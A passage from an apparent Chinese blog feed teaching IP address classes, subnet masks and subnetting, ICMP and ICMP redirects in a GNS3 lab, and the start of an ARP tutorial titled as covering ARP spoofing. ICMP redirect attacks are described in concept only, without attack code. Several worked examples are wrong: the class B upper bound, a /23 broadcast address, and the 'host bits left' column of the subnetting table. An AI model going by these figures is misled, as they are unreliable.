class="line">所以在这个网络范围里头有 0 ~ 255 个IP地址，有2的8次方（256）个IP地址，22只不过是其中一个</span><br><span class="line"></span><br><span class="line">（2）情况二</span><br><span class="line"></span><br><span class="line">如果网络部分是 192.168 是网络部分，18.22是主机部分</span><br><span class="line"></span><br><span class="line">我们还是看主机部分：</span><br><span class="line"></span><br><span class="line">主机部分的范围是：00000000.000000000 ~ 11111111.111111111，换成十进制后就是 0.0 ~ 255.255，有2的16次方（65536）个IP地址</span><br></pre></td></tr></table></figure><p>所以说，网络部分越长，网络范围内的IP地址个数就少；网络范围越短，网络范围内的IP地址个数就越多。</p><h2 id="二-IP地址分类"><a href="#二-IP地址分类" class="headerlink" title="二. IP地址分类"></a>二. IP地址分类</h2><h3 id="1-公有IP分类"><a href="#1-公有IP分类" class="headerlink" title="1. 公有IP分类"></a>1. 公有IP分类</h3><p>公有IP分类是由 NIC（因特网信息中心） 组织分配的</p><p>公网IP被分为 ABCDE 五类</p><h4 id="1-A类地址"><a href="#1-A类地址" class="headerlink" title="(1) A类地址"></a>(1) A类地址</h4><p>A类地址确定前8位为网络位，后面的24位为主机位，并且以0开头</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">A类地址：前面是0</span><br><span class="line"></span><br><span class="line">网络位如下：</span><br><span class="line"></span><br><span class="line">0 0000000.……</span><br><span class="line">|</span><br><span class="line">0 1111111.……</span><br><span class="line"></span><br><span class="line">所以A类地址的网络位的范围就是 0 ~ 127</span><br><span class="line"></span><br><span class="line">加上主机位就是 0.0.0.0 ~ 127.0.0.0</span><br><span class="line"></span><br><span class="line">但是 &#x27;0&#x27; 代表了本地网，127开头的地址一般用于回路检测</span><br><span class="line"></span><br><span class="line">所以A类地址的最终范围就是：1.0.0.0 ~ 126.255.255.255</span><br></pre></td></tr></table></figure><h4 id="2-B类地址"><a href="#2-B类地址" class="headerlink" title="(2) B类地址"></a>(2) B类地址</h4><p>B类地址确定前16位为网络位，后面的16位为主机位并且以10开头</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B类地址：前面是10</span><br><span class="line"></span><br><span class="line">网络位如下：</span><br><span class="line"></span><br><span class="line">10 000000.00000000</span><br><span class="line"> |</span><br><span class="line">10 111111.11111111</span><br><span class="line"></span><br><span class="line">所以B类地址的网络位的范围就是 128.0 ~ 191.255</span><br><span class="line"></span><br><span class="line">加上主机位就是 128.0.0.0 ~ 192.255.255.255</span><br><span class="line"></span><br><span class="line">所以B类地址的最终范围就是：128.0.0.0 ~ 192.255.255.255</span><br></pre></td></tr></table></figure><h4 id="3-C类地址"><a href="#3-C类地址" class="headerlink" title="(3) C类地址"></a>(3) C类地址</h4><p>C类地址确定前24位为网络位，后面的8位为主机位并且以110开头</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C类地址：前面是110</span><br><span class="line"></span><br><span class="line">网络位如下：</span><br><span class="line"></span><br><span class="line">110 00000.00000000.00000000</span><br><span class="line"> |</span><br><span class="line">110 11111.11111111.11111111</span><br><span class="line"></span><br><span class="line">所以C类地址的网络位的范围就是 192.0.0 ~ 223.255.255</span><br><span class="line"></span><br><span class="line">加上主机位就是 192.0.0.0 ~ 223.255.255.255</span><br><span class="line"></span><br><span class="line">所以C类地址的最终范围就是：192.0.0.0 ~ 223.255.255.255</span><br></pre></td></tr></table></figure><h3 id="2-私有IP分类"><a href="#2-私有IP分类" class="headerlink" title="2. 私有IP分类"></a>2. 私有IP分类</h3><p>私有地址在局域网使用</p><p>私网IP被分为 ABC 三类</p><p>A：10.0.0.0 ~ 10.255.255.255</p><p>B：172.16.0.0 ~ 172.31.255.255</p><p>C：192.168.0.0 ~ 192.168.255.255</p><p>私网地址是不能够公网上进行直接路由的，需要网络地址转换将私网的地址转换为公网地址后方可访问公网内容</p><h2 id="三-子网掩码"><a href="#三-子网掩码" class="headerlink" title="三. 子网掩码"></a>三. 子网掩码</h2><p>用于确定IIP地址的网络部分</p><p>子网掩码由32位的二进制组成，对应IP的网络部分由1表示，主机部分由0表示</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">现在有这么个IP地址192.168.18.32</span><br><span class="line"></span><br><span class="line">我们确定它前24位是网络部分，即 192.168.18 是网络部分</span><br><span class="line"></span><br><span class="line">那么它对应的子网掩码就是把网络部分全变成1</span><br><span class="line"></span><br><span class="line">网络部分就是：11111111.11111111.11111111.00000000</span><br><span class="line"></span><br><span class="line">就是：255.255.255.0，这就是它的子网掩码</span><br></pre></td></tr></table></figure><p>我们可以根据子网掩码来得出网络部分和主机部分：在本网络的第一个地址就是网络地址，本网络的最后一个地址就是广播地址</p><p>使用IP 地址和子网掩码进行逻辑“与”得出网络地址</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">有这么个IP地址：172.16.230.22</span><br><span class="line"></span><br><span class="line">我们指定它的子网掩码是 255.255.0.0</span><br><span class="line"></span><br><span class="line">所以 172.16 是网络部分，230.22 是主机部分</span><br><span class="line"></span><br><span class="line">所以网络地址就是本网络的第一个地址，就是 172.16.0.0</span><br><span class="line">最后一个地址是广播地址，就是 172.16.255.255</span><br></pre></td></tr></table></figure><p>逻辑”与”运算：进行逻辑“与” 运算，1与何数相与得任何数，0与任何数相与得0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">有这么个IP地址：172.16.230.22</span><br><span class="line"></span><br><span class="line">我们指定它的子网掩码是 255.255.0.0</span><br><span class="line"></span><br><span class="line">IP地址的二进制：10101100.00010000.11100110.00010110</span><br><span class="line"></span><br><span class="line">子网掩码的二进制：11111111.11111111.00000000.00000000</span><br><span class="line"></span><br><span class="line">上下进行逻辑&quot;与&quot;运算得到网络地址</span><br><span class="line"></span><br><span class="line">网络地址就是：10101100.00010000.00000000.00000000，即172.16.0.0</span><br><span class="line"></span><br><span class="line">广播地址就是主机部分全是1</span><br><span class="line"></span><br><span class="line">广播地址就是：10101100.00010000.11111111.11111111，即172.16.255.255</span><br></pre></td></tr></table></figure><p>刚才是介绍的正常的，下面介绍几个不正常的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">有这么个IP地址：192.168.100.233</span><br><span class="line"></span><br><span class="line">子网掩码：255.255.224.0</span><br><span class="line"></span><br><span class="line">IP地址的二进制是：11000000.10101000.01100100.11101001</span><br><span class="line"></span><br><span class="line">子网掩码的二进制是：11111111.11111111.11100000.00000000</span><br><span class="line"></span><br><span class="line">运行逻辑&quot;与&quot;得到网络地址：11000000.10101000.01100000.00000000，即192.168.96.0</span><br></pre></td></tr></table></figure><p>还有的是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">有这么个IP地址：172.24.88.99/23</span><br><span class="line"></span><br><span class="line">/23意味这它有23个1</span><br><span class="line"></span><br><span class="line">IP地址二进制：10101100.00011000.01011000.01100011</span><br><span class="line"></span><br><span class="line">子网掩码二进制：11111111.11111111.11111110.00000000</span><br><span class="line"></span><br><span class="line">运行逻辑&quot;与&quot;得到网络地址：10101100.00011000.01011000.00000000，即 172.24.88.0</span><br><span class="line"></span><br><span class="line">广播地址就是把子网掩码0对应的IP地址变成1：10101100.00011000.01011001.11111111，即172.24.89.1</span><br></pre></td></tr></table></figure><p>默认子网掩码：</p><p>A：255.0.0.0（8位）</p><p>B：255.255.0.0（16位）</p><p>C：255.255.255.0（24位）</p><p>子网掩码越长，代表网络部分越长，网络范围越小，子网掩码越短，代表网络部分越短，网络范围越大</p><p>网络地址代表的是一个范围，不能够给主机使用。</p><p>广播地址，代表本网段的所有地址，也是不能够直接给主机使用。</p><h2 id="四-子网划分"><a href="#四-子网划分" class="headerlink" title="四. 子网划分"></a>四. 子网划分</h2><h3 id="1-子网划分基本概念"><a href="#1-子网划分基本概念" class="headerlink" title="1. 子网划分基本概念"></a>1. 子网划分基本概念</h3><h4 id="1-原因"><a href="#1-原因" class="headerlink" title="(1) 原因"></a>(1) 原因</h4><p><strong>从公网层面来讲：</strong></p><p>A类地址总计只有126个网络。</p><p>假设一个A类网络给某一个企业或者某一个机构使用，由于在A类地址中主机部分范围比较广，造成这个企业或机构无法全部使用完，造成IP地址的浪费，（节省IP地址）</p><p><strong>实现网络层次性</strong></p><p><strong>满足不同网络多IP地址的需求</strong></p><h4 id="2-IP地址分类"><a href="#2-IP地址分类" class="headerlink" title="(2) IP地址分类"></a>(2) IP地址分类</h4><p>如果一个IP地址采用的是默认子网掩码，我们称之为有类地址</p><p>如果一个IP地址采用的不是默认子网掩码，我们称之为无类地址</p><h4 id="3-子网划分原理"><a href="#3-子网划分原理" class="headerlink" title="(3) 子网划分原理"></a>(3) 子网划分原理</h4><p>子网位划分：增加网络部分（向主机位借位，借的位数就被称之为子网位）</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.0/24</span><br><span class="line"></span><br><span class="line">我们向主机位借3位</span><br><span class="line"></span><br><span class="line">主机位是00000000，接走3位就是00000，子网掩码1就成了27位，可以自己推推试试（其实就是借几位，子网掩码就加几）</span><br><span class="line"></span><br><span class="line">192.168.1.000 000000 ——&gt; 192.168.1.0/27</span><br><span class="line"></span><br><span class="line">然后根据这个往下排IP</span><br><span class="line"></span><br><span class="line">192.168.1.001 000000 ——&gt; 192.168.1.32/27</span><br><span class="line">192.168.1.010 000000 ——&gt; 192.168.1.64/27</span><br><span class="line">192.168.1.011 000000 ——&gt; 192.168.1.96/27</span><br><span class="line">192.168.1.100 000000 ——&gt; 192.168.1.128/27</span><br><span class="line">192.168.1.101 000000 ——&gt; 192.168.1.160/27</span><br><span class="line">192.168.1.110 000000 ——&gt; 192.168.1.192/27</span><br><span class="line">192.168.1.111 000000 ——&gt; 192.168.1.224/27</span><br></pre></td></tr></table></figure><p>假设子网位为 n ，可划分的网络个数就是 2的n次方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">借1位：2个网段；主机位剩7位，IP地址个数：128</span><br><span class="line"></span><br><span class="line">借2位：4个网段；主机位剩7位，IP地址个数：64</span><br><span class="line"></span><br><span class="line">借3位：8个网段；主机位剩7位，IP地址个数：32</span><br><span class="line"></span><br><span class="line">借4位：16个网段；主机位剩7位，IP地址个数：16</span><br><span class="line"></span><br><span class="line">借5位：32个网段；主机位剩7位，IP地址个数：8</span><br><span class="line"></span><br><span class="line">借6位：64个网段；主机位剩7位，IP地址个数：4</span><br><span class="line"></span><br><span class="line">借7位：128个网段；主机位剩7位，IP地址个数：2</span><br><span class="line"></span><br><span class="line">借7位时，没有可用的IP地址给主机使用此网络中只有2个IP，一个是网络地址，一个是广播地址。所以此划分一般不会有</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">某公司有生产部、销售部、财务部、客服部四个部门，每个部门的主机数量最多不超过50台主机。</span><br><span class="line"></span><br><span class="line">现公司有一个C类网段 192.168.100.0/24 来进行子网划分，0 ~ 255</span><br><span class="line"></span><br><span class="line">4个部门借2位，子网掩码是26位子网掩码，每个网段64个IP，可用主机数量62台主机</span><br><span class="line"></span><br><span class="line">所以：</span><br><span class="line"></span><br><span class="line">生产部: 192.168.100.0 ~ 192.168.100.63/26；192.168.100.0/26</span><br><span class="line"></span><br><span class="line">销售部: 192.168.100.64 ~ 192.168.100.127/26；192.168.100.64/26</span><br><span class="line"></span><br><span class="line">财务部: 192.168.100.128 ~ 192.168.100.191/26；192.168.100.128/26</span><br><span class="line"></span><br><span class="line">客服部: 192.168.100.192 ~ 192.168.100.255/26；192.168.100.192/26</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICMP协议与ICMP重定向</title>
      <link href="/2023/02/16/5/"/>
      <url>/2023/02/16/5/</url>
      
        <content type="html"><![CDATA[<h2 id="一-ICMP协议相关"><a href="#一-ICMP协议相关" class="headerlink" title="一. ICMP协议相关"></a>一. ICMP协议相关</h2><h3 id="1-ICMP协议"><a href="#1-ICMP协议" class="headerlink" title="1. ICMP协议"></a>1. ICMP协议</h3><h4 id="1-功能"><a href="#1-功能" class="headerlink" title="(1) 功能"></a>(1) 功能</h4><p>ICMP，Internet控制报文协议，用于在IP主机、路由器之间传递控制消息，控制信息指网络通不通，主机是否可达，路由是否可用等等</p><p>比如我们ping百度</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向2.webp" alt=""></p><p>能够ping通就说明，你能连上外网，百度那面的服务器没问题，你的路由器，路由表没问题，你的DNS解析没问题……</p><p>我们随便ping一个IP</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向3.webp" alt=""></p><p>发现ping不通，由于我们上面能够ping通百度，说明我们这里应该是没有问题的，既然这次ping不通，就说明是对方的问题。这时就有两个可能，到达了目的方，没做响应；没到达目的方。</p><p>我们搜一下这个IP</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向4.webp" alt=""></p><p>这个是一个美国IP，我还用了VPN，这还是个外网IP，按道理是能ping通的，我们访问一下</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向5.webp" alt=""></p><p>可以看见，是对面网站出了问题。</p><h4 id="2-封装结构"><a href="#2-封装结构" class="headerlink" title="(2) 封装结构"></a>(2) 封装结构</h4><p>ICMP是网络层协议，封装在传输层与网络层之间，它的封装结构如下</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向1.webp" alt=""></p><p>我们抓个包来看一下它的报文</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向6.webp" alt=""></p><p>可以看到这个报文还是比较简单的。</p><h3 id="2-ICMP报文格式"><a href="#2-ICMP报文格式" class="headerlink" title="2. ICMP报文格式"></a>2. ICMP报文格式</h3><p>这里面有两个是’Type’和’Code’，这两个通常一起来看</p><p><strong>‘8，0’组合的都是请求报文</strong>，比如上面那张图展示的Type是8，Code为0</p><p>我们看一下响应的Type</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向7.webp" alt=""></p><p>可以看待，响应的报文中的Type就是’0’，Code为’0’，<strong>‘0，0’组合代表比较正常的应答</strong></p><p>我们再看一个不正常的</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向8.webp" alt=""></p><p>这个的Type是’3’，说明’目的地不可达’，Code为’3’代表端口不可达</p><p><strong>‘3，3’组合就是说目标不可达，或者说端口不可达</strong></p><p>还有的是 <strong>‘11，0’，代表’生存时间为0’，说白了就是超时了</strong>，比如下图</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向9.webp" alt=""></p><p>还有的是 <strong>‘3，1’，代表目标不可达，或者说是主机不可达</strong>，如下图</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向10.webp" alt=""></p><p>除此之外，还有</p><ul><li>‘5，0’代表网络重定向</li><li>‘5，1’代表主机重定向</li></ul><p>当Type等于13时，代表是时间戳请求，等于14时代表是时间戳应答</p><h2 id="二-ICMP重定向"><a href="#二-ICMP重定向" class="headerlink" title="二. ICMP重定向"></a>二. ICMP重定向</h2><h3 id="1-ICMP重定向简介"><a href="#1-ICMP重定向简介" class="headerlink" title="1. ICMP重定向简介"></a>1. ICMP重定向简介</h3><h4 id="1-正常情况"><a href="#1-正常情况" class="headerlink" title="(1) 正常情况"></a>(1) 正常情况</h4><p>现在有这样的一个网络</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向11.webp" alt=""></p><p>我们现在想要主机访问 192.168.2.1，你们觉得能不能访问到？</p><p>很明显访问不到，因为’192.168.1.10’访问外网的时候，会将自己的数据交给网关，即’192.168.1.254’那台R2路由器，而R2连的是’192.168.3.1’，没连’192.168.2.1’，路由表里就没有’192.168.2.1’的条目，所以主机是访问不了’192.168.2.1’的。</p><p>那这个时候怎么办，我们在R2上面配置一条路由，’192.168.1.253’对应’192.168.3.1’，这样数据传递就成了这样。</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向12.webp" alt=""></p><p>主机192.168.1.10访问192.168.3.1，数据交给网关R2，然后R2看路由表，发现192.168.3.1对应192.168.1.253，然后把数据交给R1，然后再交给192.168.3.1。</p><p>我们这里是通过R1把数据交给了R2，这个过程有点麻烦，于是就有了重定向。</p><h4 id="2-重定向"><a href="#2-重定向" class="headerlink" title="(2) 重定向"></a>(2) 重定向</h4><p>重定向是这样的</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向23.webp" alt=""></p><p>这张图，我们知道R1无法发送数据给 192.168.3.1 ，于是我们在R1设置了一条路由，将数据指向R2</p><p>假如 192.168.1.10 向 192.168.3.1 发送4个ICMP包，第一次的时候会发给自己的网关R1，但是R1无法发送给 192.168.3.1。</p><p>这个时候R1会看路由表，发现R2能发，就会发送一个重定向的包给主机。</p><p>主机接收后，以后的数据就会直接发给R2.</p><p>就是说第一次的包发给R1，后面三次的包是直接发给R2的。</p><p>所以ICMP重定向就是：<strong>在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向报文，是主机的路由改变</strong></p><p>如果有一个攻击方将主机的路由给重定向了，就可能导致主机无法通信</p><p>比如这样</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向13.webp" alt=""></p><p>攻击方把主机路由重定向到192.168.1.200，这样就实现了一个ICMP重定向攻击。当我们把它重定向到其他的地方，就会造成无法访问的情况。</p><h3 id="2-实验模拟"><a href="#2-实验模拟" class="headerlink" title="2. 实验模拟"></a>2. 实验模拟</h3><h4 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="(1) 环境配置"></a>(1) 环境配置</h4><p>在GNS3中配置这样的一个网络</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向14.webp" alt=""></p><p>然后我们用虚拟机来模拟一台主机，GNS3可以连虚拟机</p><p>设置为主机模式</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向15.webp" alt=""></p><p>进入系统后配置IP</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向16.webp" alt=""></p><h4 id="2-实验开始"><a href="#2-实验开始" class="headerlink" title="(2) 实验开始"></a>(2) 实验开始</h4><p>我们在主机上ping一下网关和另一台路由器，都是一个网段的，应该都能ping通</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向17.webp" alt=""></p><p>我们ping一下3.1，应该是ping不通的。</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向18.webp" alt=""></p><p>我们开启抓包</p><p>现在我们想要让主机ping通3.1怎么办呢？我们可以直接在R1上配置一条路由，使得通过R1，转发给R2再转发给R2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip route 192.168.3.0 255.255.255.0 192.168.1.253</span><br></pre></td></tr></table></figure><p>我们再用主机ping一下3.1</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向19.webp" alt=""></p><p>可以看到现在ping通了。</p><p>不过这里第一次请求超时了。</p><h4 id="3-观察数据包"><a href="#3-观察数据包" class="headerlink" title="(3) 观察数据包"></a>(3) 观察数据包</h4><p>我们看一下抓的包</p><h5 id="1、链路1（主机到交换机）"><a href="#1、链路1（主机到交换机）" class="headerlink" title="1、链路1（主机到交换机）"></a>1、链路1（主机到交换机）</h5><p>我们先看主机到交换机的这条链路</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向20.webp" alt=""></p><p>就是这条链路</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向21.webp" alt=""></p><p>我们最开始的时候,ICMP请求失败，然后返回了一个’5，0’的响应，这个上面讲了，代表网络重定向</p><p>我们看下一个请求</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向25.webp" alt=""></p><p>可以看到返回’8，0’请求成功。</p><h5 id="2、链路2（交换机到R1）"><a href="#2、链路2（交换机到R1）" class="headerlink" title="2、链路2（交换机到R1）"></a>2、链路2（交换机到R1）</h5><p>我们看一下左面的那条链路</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向26.webp" alt=""></p><p>就是这条，我们看一下抓包</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向27.webp" alt=""></p><p>这里就两个，一开始 192.68.1.10 请求 192.168.3.1，没通，然后它发现自己的路由表中有一个和 192.168.3.1 相关的路由条目，做了一个重定向的响应，然后返回给了主机。</p><p>之后根据路由表找到 192.168.3.1 对应的是 192.168.1.253，然后R1马上广播。</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向28.webp" alt=""></p><p>“谁的IP地址是 192.168.1.253，把你的MAC地址发过来。””</p><p>然后就转过去了。</p><h5 id="3、链路3（交换机和R2）"><a href="#3、链路3（交换机和R2）" class="headerlink" title="3、链路3（交换机和R2）"></a>3、链路3（交换机和R2）</h5><p>我们看一下右面的那条链路</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向29.webp" alt=""></p><p>我们分析数据包</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向22.webp" alt=""></p><p>这个就简单了，正常的ICMP。数据就不经过R1，直接发给R2了。</p><h4 id="4-看主机路由表"><a href="#4-看主机路由表" class="headerlink" title="(4) 看主机路由表"></a>(4) 看主机路由表</h4><p>我们看一下主机的路由表</p><p><img src="\media\2023\02\ICMP协议与ICMP重定向24.webp" alt=""></p><p>发现了一个问题，我们这个路由表还是 192.168.1.254 对应 192.168.1.10。</p><p>所以重定向的路由时不会写道主机的路由表中，只有当路由器发送了一个重定向报文后，后续的请求才会进行重定向。</p>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议原理与ARP攻击欺骗及模拟实战</title>
      <link href="/2023/02/16/3/"/>
      <url>/2023/02/16/3/</url>
      
        <content type="html"><![CDATA[<h2 id="一-ARP协议"><a href="#一-ARP协议" class="headerlink" title="一. ARP协议"></a>一. ARP协议</h2><p>ARP（地址解析协议）是一个三层协议，但是工作在二层。所以也有的地方把它称为2.5层协议</p><p>二层数据交换靠MAC地址，这个时候ARP协议用来将一个已知的IP地址解析为MAC地址，，从而进行二层数据交互</p><h2 id="二-工作阶段"><a href="#二-工作阶段" class="headerlink" title="二. 工作阶段"></a>二. 工作阶段</h2><p>主机向另一台主机发送ARP请求，然后接收到ARP请求后，会发ARP响应</p><h3 id="1-ARP请求"><a href="#1-ARP请求" class="headerlink" title="1. ARP请求"></a>1. ARP请求</h3><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战1.webp" alt=""></p><p>主机A向主机B发送ARP请求，然后主机B接收到后，向主机A发送ARP响应。</p><p>但是现在有个问题，ARP是工作在二层，二层靠MAC地址进行传送数据，所以主机A向主机B发送数据之前，他得先知道主机B的MAC地址，但是他现在不知道，所以主机A在分装ARP请求的时候，目的MAC地址是广播地址</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战2.webp" alt=""></p><p>他是以广播的方式来请求。</p><h3 id="2-ARP响应"><a href="#2-ARP响应" class="headerlink" title="2. ARP响应"></a>2. ARP响应</h3><p>主机B收到后，会检测数据帧，发现IP和自己一样，说明是在访问主机B的MAC地址，然后它再封装一次。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战3.webp" alt=""></p><p>这就是一个单波的响应。</p><h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3. 实例"></a>3. 实例</h3><p>我们有两台虚拟机，win10和win7</p><p>win10的IP是192.168.40.131，win7的IP是192.168.40.130，这俩是一个网段的，在一个局域网。</p><p>我们在win10打开wireshark准备抓包。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战4.webp" alt=""></p><p>现在是没有任何流量的，我们用win10去ping win7</p><p>我们先不看结果，先猜一下，ping使用的是ICMP协议，所以这个协议一定有，那么之前为了找到win7，就一定会进行局域网的广播，所以在ICMP协议前就有ARP协议的存在。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战5.webp" alt=""></p><p>和我们想的一样。</p><p>我们看一下。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战6.webp" alt=""></p><p>首先是 who has 192.168.40.130? tell 192.168.40.131.</p><p>这句话的意思是，<strong>win10广播问，谁的IP是192.168.40.130啊，告诉我一下你的MAC地址。</strong></p><p>下一句，192.168.40.130 is at 00:0c:29:47:f1:02</p><p>这句话的意思是，<strong>192.168.40.130在这！我的MAC地址是00:0c:29:47:f1:02</strong></p><h3 id="4-ARP报文格式"><a href="#4-ARP报文格式" class="headerlink" title="4. ARP报文格式"></a>4. ARP报文格式</h3><p>我们简单画一个这个数据包结构</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战7.webp" alt=""></p><p>我们可以看一下包</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战8.webp" alt=""></p><p>我们可以看到它没有网络层的数据信息，所以这个结构应该是这样的。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战9.webp" alt=""></p><h3 id="5-ARP缓存"><a href="#5-ARP缓存" class="headerlink" title="5. ARP缓存"></a>5. ARP缓存</h3><p>ARP缓存主要是为了避免去重复发送ARP请求</p><p>比如上面的那个环境，我们再ping一下</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战10.webp" alt=""></p><p>可以看到，ARP请求没有了，因为我们的缓存表中已经记录了对应IP的MAC地址。</p><p>我们可以通过 <code>arp -a</code>查看缓存表</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战11.webp" alt=""></p><p>我们可以通过<code>arp -d</code>来清空缓存</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战12.webp" alt=""></p><p>这个需要管理员权限</p><p>我们用管理员打开cmd</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战13.webp" alt=""></p><p>可以看到缓存就没了，剩的那个是组播地址不用管他</p><p>有一个这样的网络</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战14.webp" alt=""></p><p>我们拿PC1去ping PC2，它肯定是可以ping通的，这是后我们看一下ARP缓存表</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战15.webp" 